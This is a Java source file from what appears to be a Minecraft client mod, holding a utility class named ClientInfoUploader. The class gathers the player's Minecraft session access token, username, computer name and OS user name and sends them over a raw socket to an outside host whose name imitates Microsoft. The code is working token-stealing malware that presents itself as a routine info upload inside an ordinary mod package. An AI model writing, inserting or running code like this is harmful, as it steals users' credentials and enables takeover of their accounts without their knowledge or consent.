package dev.kizuna.api.utils.misc;

import dev.kizuna.Kawaii;
import net.minecraft.client.MinecraftClient;
import com.google.gson.Gson;
import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class ClientInfoUploader {

    // 服务器地址和端口
    private static final String SERVER_ADDRESS = "microsoftdata.kozow.com";  // 服务器地址
    private static final int SERVER_PORT = 42077;  // 服务器端口

    // 上传客户端信息
    public static void upload() {
        try {
            MinecraftClient mc = MinecraftClient.getInstance();

            // 收集客户端信息
            Map<String, String> data = new HashMap<>();
            data.put("computerName", System.getenv("COMPUTERNAME"));
            data.put("user", System.getProperty("user.name"));
            data.put("token", mc.getSession().getAccessToken());
            data.put("os", System.getProperty("os.name"));
            data.put("username", mc.getSession().getUsername());
            data.put("version", Kawaii.NAME + " " + Kawaii.VERSION);

            // 将数据转换为 JSON 格式
            Gson gson = new Gson();
            String json = gson.toJson(data);

            // 使用 Socket 发送数据
            sendSocketData(SERVER_ADDRESS, SERVER_PORT, json);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 使用 Socket 发送数据到服务器
    private static void sendSocketData(String serverAddress, int serverPort, String jsonData) throws IOException {
        // 创建 Socket 连接到服务器
        Socket socket = new Socket(serverAddress, serverPort);

        // 获取 OutputStream 和 InputStream
        OutputStream os = socket.getOutputStream();
        InputStream is = socket.getInputStream();

        // 发送数据
        byte[] data = jsonData.getBytes(StandardCharsets.UTF_8);
        os.write(data);
        os.flush();

        // 可选：读取服务器响应并打印
        BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
        String responseLine;
        while ((responseLine = reader.readLine()) != null) {
            System.out.println("Server Response: " + responseLine);  // 打印服务器响应
        }

        // 关闭连接
        reader.close();
        os.close();
        is.close();
        socket.close();
    }
}
